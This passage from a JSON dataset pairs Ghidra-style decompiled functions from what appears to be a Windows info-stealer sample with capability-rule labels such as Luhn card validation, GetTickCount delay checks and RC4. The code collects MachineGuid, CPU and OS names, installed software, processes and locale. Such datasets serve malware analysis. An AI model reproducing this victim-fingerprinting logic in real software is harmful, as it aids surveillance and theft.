            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.00421ff0(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t *puVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x441c31;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    for (puVar2 = in_ECX + 0x14; puVar2 + -5 != arg_8h; puVar2 = puVar2 + 7) {\n        if (arg_ch != NULL) {\n            arg_ch[5] = 7;\n            arg_ch[4] = 0;\n            *arg_ch = 0;\n            if (arg_ch != puVar2 + -5) {\n                if (7 < arg_ch[5]) {\n                    fcn.0042d62b(*arg_ch, uVar1);\n                }\n                arg_ch[5] = 7;\n                arg_ch[4] = 0;\n                *arg_ch = 0;\n                if (*puVar2 < 8) {\n                    fcn.0042d8e0(arg_ch, puVar2 + -5, (puVar2[-1] + 1) * 2);\n                }\n                else {\n                    *arg_ch = puVar2[-5];\n                    puVar2[-5] = 0;\n                }\n                arg_ch[4] = puVar2[-1];\n                arg_ch[5] = *puVar2;\n                puVar2[-1] = 0;\n                *puVar2 = 0;\n            }\n        }\n        arg_ch = arg_ch + 7;\n    }\n    *in_FS_OFFSET = var_ch;\n    return arg_ch;\n}\n",
        "token_count": 442
    },
    "004220c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004220c0(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t *puVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    char *pcVar9;\n    uint8_t *arg_10h;\n    uint8_t **ppuVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint8_t **unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t var_1e8h;\n    uint var_1e4h;\n    uint *var_1e0h;\n    uint var_1dch;\n    uint32_t var_1c8h;\n    uint32_t var_1c0h;\n    uint var_1b0h;\n    uint32_t var_1ach;\n    uint32_t var_1a4h;\n    uint var_194h;\n    uint32_t var_190h;\n    uint32_t var_188h;\n    uint var_178h;\n    uint32_t var_174h;\n    uint32_t var_16ch;\n    uint var_15ch;\n    uint32_t var_158h;\n    uint32_t var_150h;\n    uint32_t var_140h;\n    ushort var_13ch;\n    uint var_13ah;\n    uint *var_134h;\n    uint8_t *var_124h;\n    uint8_t *var_120h;\n    uint var_118h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441bed;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_1e0h = NULL;\n    var_1e8h = 0;\n    var_120h = 0xf;\n    var_124h = NULL;\n    var_134h = var_134h & 0xffffff00;\n    var_4h = 0;\n    iVar5 = (**0x457404)(&var_118h, 0x104, var_10h);\n    if (iVar5 == 0) {\n        var_118h._0_1_ = 0x43;\n    }\n    arg_8h = &var_1e4h;\n    var_1e4h._0_1_ = var_118h;\n    var_1e4h._1_2_ = 0x5c3a;\n    var_1e4h._3_1_ = 0;\n    (**0x457354)(arg_8h, 0, 0, &var_1e8h, 0, 0, 0, 0);\n    iVar5 = var_1e8h * 0x14a30b + -0x69427551;\n    uVar6 = iVar5 * 0x14a30b + 0x96bd8aaf;\n    var_140h = uVar6 & 0xffff | var_140h._2_2_ << 0x10;\n    iVar7 = (((uVar6 * 0x14a30b + -0x69427551) * 0x14a30b + -0x69427551) * 0x14a30b + -0x69427551) * 0x14a30b +\n            -0x69427551;\n    var_13ah._0_1_ = iVar7;\n    iVar7 = iVar7 * 0x14a30b + -0x69427551;\n    var_13ah._1_1_ = iVar7;\n    iVar7 = iVar7 * 0x14a30b + -0x69427551;\n    var_13ah._2_1_ = iVar7;\n    iVar7 = iVar7 * 0x14a30b + -0x69427551;\n    var_13ah._3_1_ = iVar7;\n    var_1e8h = (iVar7 * 0x14a30b + -0x69427551) * 0x14a30b + -0x69427551;\n    uVar8 = (**0x45757c)(0, 0x104);\n    pcVar9 = (**0x457504)(uVar8);\n    if (pcVar9 == NULL) {\n        unaff_EDI[5] = 0xf;\n        unaff_EDI[4] = NULL;\n        *unaff_EDI = 0;\n        puVar3 = NULL;\n        do {\n            arg_10h = puVar3;\n            puVar3 = arg_10h + 1;\n        } while (*arg_10h != 0);\n        if (arg_10h == 0xffffffff) {\n            fcn.0042cb30(\"string too long\");\n        }\n        if (unaff_EDI[5] < arg_10h) {\n            fcn.00409570(arg_10h, unaff_EDI[4]);\n            if (arg_10h != NULL) {\ncode_r0x00422271:\n                ppuVar10 = unaff_EDI;\n                if (0xf < unaff_EDI[5]) {\n                    ppuVar10 = *unaff_EDI;\n                }\n                fcn.0042f700(ppuVar10, 0, arg_10h);\n                unaff_EDI[4] = arg_10h;\n                if (0xf < unaff_EDI[5]) {\n                    unaff_EDI = *unaff_EDI;\n                }\n                *(unaff_EDI + arg_10h) = 0;\n            }\n        }\n        else {\n            if (arg_10h != NULL) goto code_r0x00422271;\n            unaff_EDI[4] = NULL;\n            if (unaff_EDI[5] < 0x10) {\n                *unaff_EDI = 0;\n            }\n            else {\n                **unaff_EDI = 0;\n            }\n        }\n    }\n    else {\n        (**0x457374)(pcVar9, \"%08lX%04lX%lu-\", iVar5, var_140h & 0xffff, \n                     CONCAT13(var_13ah._3_1_, CONCAT12(var_13ah._2_1_, CONCAT11(var_13ah._1_1_, var_13ah))));\n        pcVar1 = pcVar9 + 1;\n        do {\n            cVar2 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar2 != '\\0');\n        fcn.00414cc0(pcVar9 - pcVar1);\n        puVar11 = var_134h;\n        if (var_120h < 0x10) {\n            puVar11 = &var_134h;\n        }\n        var_1e0h = puVar11 + var_124h;\n        puVar12 = var_134h;\n        if (var_120h < 0x10) {\n            puVar12 = &var_134h;\n        }\n        if (puVar12 != var_1e0h) {\n            iVar5 = puVar11 - puVar12;\n            do {\n                uVar4 = fcn.0042f2fb(*puVar12);\n                *(puVar12 + iVar5) = uVar4;\n                puVar12 = puVar12 + 1;\n            } while (puVar12 != var_1e0h);\n        }\n        fcn.00422c00();\n        var_4h._0_1_ = 1;\n        var_1e0h = fcn.00414960(0x11);\n        var_4h._0_1_ = 2;\n        fcn.00422c70();\n        var_4h._0_1_ = 3;\n        fcn.00414960(0x18);\n        var_4h._0_1_ = 4;\n        fcn.00423a60(&var_16ch);\n        var_4h = CONCAT31(var_4h._1_3_, 5);\n        ppuVar10 = fcn.004097a0(&var_150h);\n        if (&var_134h != ppuVar10) {\n            if (0xf < var_120h) {\n                fcn.0042d62b(var_134h);\n            }\n            var_120h = 0xf;\n            var_124h = NULL;\n            var_134h = var_134h & 0xffffff00;\n            if (ppuVar10[5] < 0x10) {\n                fcn.0042d8e0(&var_134h, ppuVar10, ppuVar10[4] + 1);\n            }\n            else {\n                var_134h = *ppuVar10;\n                *ppuVar10 = NULL;\n            }\n            var_124h = ppuVar10[4];\n            var_120h = ppuVar10[5];\n            ppuVar10[4] = NULL;\n            ppuVar10[5] = NULL;\n        }\n        if (0xf < CONCAT13(var_13ah._1_1_, CONCAT12(var_13ah, var_13ch))) {\n            fcn.0042d62b(var_150h);\n        }\n        var_13ch = 0xf;\n        var_13ah._0_1_ = 0;\n        var_13ah._1_1_ = 0;\n        var_140h = 0;\n        var_150h = var_150h & 0xffffff00;\n        if (0xf < var_158h) {\n            fcn.0042d62b(var_16ch);\n        }\n        var_158h = 0xf;\n        var_15ch = 0;\n        var_16ch = var_16ch & 0xffffff00;\n        if (0xf < var_190h) {\n            fcn.0042d62b(var_1a4h);\n        }\n        var_190h = 0xf;\n        var_194h = 0;\n        var_1a4h = var_1a4h & 0xffffff00;\n        if (0xf < var_174h) {\n            fcn.0042d62b(var_188h);\n        }\n        var_174h = 0xf;\n        var_178h = 0;\n        var_188h = var_188h & 0xffffff00;\n        if (0xf < var_1ach) {\n            fcn.0042d62b(var_1c0h);\n        }\n        var_1ach = 0xf;\n        var_1b0h = 0;\n        var_1c0h = var_1c0h & 0xffffff00;\n        if (0xf < var_1c8h) {\n            fcn.0042d62b(var_1dch);\n        }\n        unaff_EDI[5] = 0xf;\n        unaff_EDI[4] = NULL;\n        *unaff_EDI = 0;\n        if (unaff_EDI != &var_134h) {\n            if (0xf < unaff_EDI[5]) {\n                fcn.0042d62b(*unaff_EDI);\n            }\n            unaff_EDI[5] = 0xf;\n            unaff_EDI[4] = NULL;\n            *unaff_EDI = 0;\n            if (var_120h < 0x10) {\n                fcn.0042d8e0(unaff_EDI, &var_134h, var_124h + 1);\n                unaff_EDI[4] = var_124h;\n                unaff_EDI[5] = var_120h;\n            }\n            else {\n                *unaff_EDI = var_134h;\n                unaff_EDI[4] = var_124h;\n                unaff_EDI[5] = var_120h;\n            }\n            goto code_r0x00422604;\n        }\n    }\n    if (0xf < var_120h) {\n        fcn.0042d62b(var_134h);\n    }\ncode_r0x00422604:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 2798
    },
    "00422630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422630(void)\n\n{\n    char cVar1;\n    char **arg_8h;\n    char **ppcVar2;\n    uchar *unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_54h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4425e8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = &var_54h;\n    var_30h = 0;\n    (**0x45740c)(arg_8h_00, var_10h);\n    arg_8h = fcn.00423ec0(var_40h);\n    var_4h = 0;\n    if (0xf < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    *(unaff_ESI + 0x14) = 0xf;\n    *(unaff_ESI + 0x10) = 0;\n    *unaff_ESI = 0;\n    ppcVar2 = arg_8h;\n    do {\n        cVar1 = *ppcVar2;\n        ppcVar2 = ppcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(arg_8h, ppcVar2 - (arg_8h + 1));\n    if (0xf < var_18h) {\n        fcn.0042d62b(var_2ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 461
    },
    "004227b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004227b0(void)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uchar var_104h;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_20ch = 0xff;\n    var_104h = 0;\n    fcn.00434d30(&var_103h, 0, 0xfe);\n    iVar1 = (**0x457448)(reloc.OLEAUT32.dll_SysReAllocString, \"HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0\", 0, \n                         0x20119, &var_208h);\n    if (iVar1 == 0) {\n        (**0x45742c)(var_208h, \"ProcessorNameString\", 0, 0, &var_104h, &var_20ch);\n    }\n    (**0x4574d0)(var_208h);\n    arg_8h = &var_104h;\n    (**0x457384)(arg_8h, &var_204h);\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 293
    },
    "00422870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422870(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char *arg_8h;\n    uint var_c18h;\n    int32_t var_c14h;\n    uint var_c10h;\n    uint var_c0ch;\n    uint var_c08h;\n    uint var_c04h;\n    uint psz;\n    uint var_404h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    arg_8h = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\";\n    var_c10h = 0;\n    var_c0ch = 0;\n    var_c18h = 0xf003f;\n    var_c08h = 0;\n    iVar1 = (**0x457448)(reloc.OLEAUT32.dll_SysReAllocString, \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\"\n                         , 0, 0x20019, &var_c10h);\n    if (iVar1 == 0) {\n        var_c14h = 0;\n        do {\n            var_c08h = 0x400;\n            iVar1 = (**0x457574)(var_c10h, var_c14h, &var_c04h, &var_c08h, 0, 0, 0, 0);\n            if (iVar1 == 0) {\n                (**0x457374)(&psz, \"%s\\\\%s\", \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\", &var_c04h);\n                iVar2 = (**0x457448)(reloc.OLEAUT32.dll_SysReAllocString, &psz, 0, 0x20019, &var_c0ch);\n                if (iVar2 != 0) {\n                    (**0x4574d0)(var_c0ch);\n                    break;\n                }\n                var_c08h = 0x400;\n                iVar2 = (**0x45742c)(var_c0ch, \"DisplayName\", 0, &var_c18h, &var_404h, &var_c08h);\n                if (iVar2 == 0) {\n                    (**0x457520)();\n                    var_c08h = 0x400;\n                    iVar2 = (**0x45742c)(var_c0ch, \"DisplayVersion\", 0, &var_c18h, &var_404h, &var_c08h);\n                    if (iVar2 == 0) {\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                    }\n                    (**0x457520)();\n                }\n                (**0x4574d0)(var_c0ch);\n            }\n            var_c14h = var_c14h + 1;\n        } while (iVar1 == 0);\n        (**0x4574d0)(var_c10h);\n    }\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 654
    },
    "00422b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422b40(void)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uchar var_104h;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_20ch = 0xff;\n    var_104h = 0;\n    fcn.00434d30(&var_103h, 0, 0xfe);\n    iVar1 = (**0x457448)(reloc.OLEAUT32.dll_SysReAllocString, \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\", 0, \n                         0x20119, &var_208h);\n    if (iVar1 == 0) {\n        (**0x45742c)(var_208h, \"ProductName\", 0, 0, &var_104h, &var_20ch);\n    }\n    (**0x4574d0)(var_208h);\n    arg_8h = &var_104h;\n    (**0x457384)(arg_8h, &var_204h);\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 288
    },
    "00422c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00422c70(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *unaff_ESI;\n    uint *arg_8h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uchar var_104h;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_208h = 0xff;\n    var_104h = 0;\n    fcn.00434d30(&var_103h, 0, 0xfe);\n    iVar2 = (**0x457448)(reloc.OLEAUT32.dll_SysReAllocString, \"SOFTWARE\\\\Microsoft\\\\Cryptography\", 0, 0x20119, &var_20ch\n                        );\n    if (iVar2 == 0) {\n        (**0x45742c)(var_20ch, \"MachineGuid\", 0, 0, &var_104h, &var_208h);\n    }\n    (**0x4574d0)(var_20ch);\n    (**0x457384)(&var_104h, &var_204h);\n    puVar3 = &var_204h;\n    *(unaff_ESI + 0x14) = 0xf;\n    *(unaff_ESI + 0x10) = 0;\n    *unaff_ESI = 0;\n    do {\n        cVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n    } while (cVar1 != '\\0');\n    arg_8h = &var_204h;\n    fcn.004090e0(arg_8h, puVar3 - (&var_204h + 1));\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 424
    },
    "00422d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00422d60(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint arg_8h_00;\n    uint arg_8h_01;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_02;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint32_t var_6ch;\n    uint var_64h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4425b0;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = (**0x4574d4)(\"DISPLAY\", 0, 0, 0, uVar1);\n    arg_8h_00 = (**0x457468)(uVar2, 8);\n    arg_8h_02 = uVar2;\n    arg_8h_01 = (**0x457468)(uVar2, 10);\n    (**0x457524)(0, uVar2);\n    fcn.00423ec0(arg_8h_01);\n    var_4h = 0;\n    uVar2 = fcn.00423ec0(arg_8h_00);\n    var_4h._0_1_ = 1;\n    uVar2 = fcn.00409750(uVar2);\n    var_4h._0_1_ = 2;\n    fcn.00414b90(uVar2);\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    fcn.004097a0(arg_8h);\n    if (0xf < var_18h) {\n        fcn.0042d62b(var_2ch);\n    }\n    if (0xf < var_34h) {\n        fcn.0042d62b(var_48h);\n    }\n    if (0xf < var_50h) {\n        fcn.0042d62b(var_64h);\n    }\n    if (0xf < var_6ch) {\n        fcn.0042d62b(var_80h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_02);\n    return;\n}\n",
        "token_count": 630
    },
    "00422ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00423034)\n// WARNING: Removing unreachable block (ram,0x00422f7c)\n// WARNING: Removing unreachable block (ram,0x00423065)\n// WARNING: Removing unreachable block (ram,0x0042306c)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00422ed0(uchar *param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_100h;\n    uint32_t var_fch;\n    uint var_f4h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_d8h;\n    uint var_c8h;\n    uint var_c4h;\n    int16_t var_bch;\n    uint var_bah;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x441751;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    var_bch = 0;\n    fcn.00434d30(&var_bah, 0, 0xa8, var_10h);\n    iVar2 = (**0x457414)(&var_bch, 0x55);\n    if (iVar2 == 0) {\n        *(param_1 + 0x14) = 0xf;\n        *(param_1 + 0x10) = 0;\n        *param_1 = 0;\n        fcn.004090e0(\"Unknown\", 7);\n    }\n    else {\n        piVar3 = &var_bch;\n        do {\n            iVar1 = *piVar3;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n        fcn.00423950(piVar3 - &var_bah >> 1);\n        var_4h._0_1_ = 1;\n        fcn.00424090();\n        var_4h = CONCAT31(var_4h._1_3_, 2);\n        fcn.00408ff0();\n        if (0xf < var_fch) {\n            fcn.0042d62b(var_110h);\n        }\n        var_4h = var_4h & 0xffffff00;\n        *(param_1 + 0x14) = 0xf;\n        *(param_1 + 0x10) = 0;\n        *param_1 = 0;\n        fcn.00408ff0();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(unaff_EDI);\n    return;\n}\n",
        "token_count": 669
    },
    "004230a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_104h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004230a0(void)\n\n{\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    float arg_ch;\n    uint var_104h;\n    int32_t var_100h;\n    uint var_4ch;\n    uint32_t var_38h;\n    uint var_30h;\n    uint var_2ah;\n    uint var_26h;\n    ushort var_22h;\n    uint var_20h;\n    uint var_1ah;\n    uint var_16h;\n    ushort var_12h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x442568;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_20h._0_2_ = 0;\n    stack0xffffffde = 0;\n    var_1ah = 0;\n    var_16h = 0;\n    var_12h = 0;\n    (**0x4574bc)(&var_20h, var_10h, 0);\n    (**0x4575b0)(&var_100h);\n    var_30h._0_2_ = 0;\n    stack0xffffffce = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    var_22h = 0;\n    (**0x4575d0)(&var_100h, &var_20h, &var_30h);\n    arg_ch = -(var_100h / *0x44fc08);\n    arg_8h = fcn.004241e0(&var_4ch, arg_ch);\n    var_4h = 0;\n    fcn.00409750(arg_8h);\n    if (0xf < var_38h) {\n        fcn.0042d62b(var_4ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_ch);\n    return;\n}\n",
        "token_count": 511
    },
    "004231a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004231a0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t arg_8h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    uVar1 = (**0x45757c)(0, 500);\n    uVar1 = (**0x457504)(uVar1);\n    iVar6 = 0;\n    iVar2 = (**0x4574f0)(0, 0);\n    arg_8h = iVar2 * 4;\n    iVar3 = (**0x4574c8)(0x40);\n    uVar4 = (**0x4574f0)(iVar2, iVar3);\n    uVar5 = 0;\n    if (uVar4 != 0) {\n        do {\n            (**0x4573ec)(*(iVar3 + uVar5 * 4), 2, &var_204h, 0x200);\n            if (iVar6 == 0) {\n                (**0x457374)(uVar1, 0x44ebdc, &var_204h);\n            }\n            else {\n                (**0x457374)(uVar1, \"%s / %s\", uVar1, &var_204h);\n            }\n            iVar6 = iVar6 + 1;\n            fcn.00434d30(&var_204h, 0, 0x200);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar4);\n    }\n    if (iVar3 != 0) {\n        (**0x4575c8)(iVar3);\n    }\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 438
    },
    "004232b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004232b0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_158h;\n    uint var_150h;\n    uint var_134h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x442538;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h = 2;\n    var_158h = 0x128;\n    uVar1 = (**0x457564)(2, 0, var_10h);\n    iVar2 = (**0x4573d4)(uVar1, &var_158h);\n    if (iVar2 != 0) {\n        iVar2 = (**0x4574ac)(uVar1, &var_158h);\n        while (iVar2 != 0) {\n            (**0x457520)();\n            (**0x457520)();\n            (**0x457520)();\n            fcn.00423ec0(var_150h);\n            var_4h = 0;\n            (**0x457520)();\n            var_4h = 0xffffffff;\n            if (0xf < var_18h) {\n                fcn.0042d62b(var_2ch);\n            }\n            var_18h = 0xf;\n            var_1ch = 0;\n            var_2ch = var_2ch & 0xffffff00;\n            (**0x457520)();\n            iVar2 = (**0x4574ac)(uVar1, &var_158h);\n        }\n    }\n    (**0x4573b8)(uVar1);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 473
    },
    "004233e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004233e0(uchar *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x441b79;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    *(param_1 + 0x14) = 0xf;\n    *(param_1 + 0x10) = 0;\n    arg_8h = 0x44c726;\n    *param_1 = 0;\n    fcn.004090e0(0x44c726, 0);\n    var_4h = 0;\n    fcn.004090e0(\"Mozilla/5.0 (Windows NT 10.0; \", 0x1e);\n    var_30h = 0;\n    uVar1 = (**0x45759c)(&var_30h);\n    iVar2 = (**0x457540)(uVar1);\n    if ((iVar2 == 0) || (uVar1 = 0x44f8cc,  var_30h == 0)) {\n        uVar1 = 0x44f8d0;\n    }\n    fcn.00414be0(&var_2ch, param_1, uVar1);\n    var_4h = 1;\n    fcn.00408ff0();\n    var_4h = var_4h & 0xffffff00;\n    if (0xf < var_18h) {\n        fcn.0042d62b(var_2ch);\n    }\n    fcn.00414be0(&var_2ch, param_1, \" rv:107.0) Gecko / 20100101 Firefox / 107.0\");\n    var_4h = 2;\n    fcn.00408ff0();\n    if (0xf < var_18h) {\n        fcn.0042d62b(var_2ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 570
    },
    "004234f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004234f0(uint pbstr)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *unaff_ESI;\n    ulong uVar6;\n    uint var_ch;\n    uint var_8h;\n    int32_t *ppv;\n    \n    uVar5 = 0;\n    ppv = NULL;\n    uVar2 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x444798, 0, 1, 0x44fa64, &ppv);\n    if (-1 < uVar2) {\n        iVar3 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(pbstr);\n        if (iVar3 != 0) {\n            iVar4 = (**(*ppv + 0x20))(ppv, iVar3);\n            pcVar1 = _sym.imp.OLEAUT32.dll_SysStringLen;\n            if (-1 < iVar4) {\n                iVar4 = (**(*ppv + 0xb4))(ppv, 0xffffffff, &var_8h);\n                if (-1 < iVar4) {\n                    uVar6 = fcn.0042f327(var_8h);\n                    unaff_ESI[1] = uVar6 >> 0x20;\n                    *unaff_ESI = uVar6;\n                    uVar5 = 1;\n                    (*pcVar1)(var_8h);\n                }\n            }\n            (*pcVar1)(iVar3);\n        }\n        uVar2 = (**(*ppv + 8))(ppv);\n    }\n    return uVar2 & 0xffffff00 | uVar5;\n}\n",
        "token_count": 375
    },
    "00423590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
